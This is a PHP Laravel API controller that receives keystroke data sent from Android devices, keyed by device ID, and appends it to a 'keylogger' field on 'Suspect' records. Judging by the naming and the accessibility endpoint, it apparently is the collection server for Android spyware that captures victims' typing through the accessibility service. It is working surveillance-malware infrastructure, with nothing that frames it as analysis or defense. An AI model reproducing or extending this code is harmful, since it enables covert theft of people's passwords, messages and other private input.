<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Suspect;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class AccessibilityController extends Controller
{
    public function post(Request $request){
        $data = $request->all();

        $suspect = Suspect::where('android_id', $data['androidId'])->first();

        if ($suspect){
            if ($suspect->keylogger) {
                $suspect->keylogger .= $data['data'];
            } else {
                $suspect->keylogger = $data['data'];
            }
            $suspect->save();
        } else {
            $suspect = Suspect::create([
                'android_id' => $data['androidId'],
                'name' => $data['name'],
                'location' => '',
                'keylogger' => $data['data']
            ]);
        }

        return response()->json(['success' => true]);
    }
}
